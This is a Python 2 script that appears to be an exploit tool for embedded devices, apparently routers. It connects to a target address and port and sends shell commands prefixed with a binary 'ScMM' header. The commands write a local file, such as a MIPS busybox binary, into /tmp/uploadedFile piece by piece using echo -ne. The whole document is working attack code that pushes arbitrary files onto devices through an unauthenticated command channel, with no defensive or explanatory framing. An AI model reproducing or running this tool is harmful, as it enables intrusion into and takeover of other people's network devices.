#!/usr/bin/python

import socket
import sys
import string
import asyncore

ip = sys.argv[1]
port = sys.argv[2]
fileName = sys.argv[3]

sys.stderr.write("Connecting to "+ip+":"+port+"\n")

def getSocket():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(128)
		s.connect((ip,int(port)))
		#s.setblocking(0)

	except:
		sys.stderr.write("Could not connect!\n")
		sys.exit()
	return s

s = getSocket()

sys.stderr.write("Reading in file\n")

f = open(fileName,'rb')

fileData = ""

def getPrepend(cmd):
	headerHex = "53:63:4d:4d:0:0:0:7:0:0:0";
	prependString = ""
	for hexString in string.split(headerHex,":"):
		#print hexString
		prependString += chr(int(hexString,16))

	#remove this to get proper length
	#prependString += chr(0x3)
	#print len(cmd)+1

	prependString += chr(len(cmd)+1)

	return prependString

def sendCommand(s,cmd):
	#print cmd
	s.send(cmd)
	

#cmd = "echo -ne '"+dumpStr+"' >> /tmp/busybox-mips"

#try:
if True:
	dumpCount = 0
	dumpMax = 32
	dumpStr = ""

	resetCount = 0
	resetMax = 8192/2

	byte = None

	while byte != "" or byte == None:

		byte = f.read(1)

		if byte != "":
			dumpStr += "\\x"+format(ord(byte),"x")
			dumpCount += 1
			resetCount += 1

		if dumpMax < dumpCount or byte == "":

			if resetMax < resetCount:
				s.close()
				print "Resetting socket"
				s = getSocket()
				resetCount = 0

			cmd = "echo -ne '"+dumpStr+"' >> /tmp/uploadedFile"
			#cmd = "ls"
			print cmd

			prepend = getPrepend(cmd)

			sendCommand(s,prepend+cmd+"\n")

			dumpCount = 0
			dumpStr = ""

			#s.recv(1024)

#except:
#	f.close()
#	print "Could not read file"
#	sys.exit()


s.close()


	
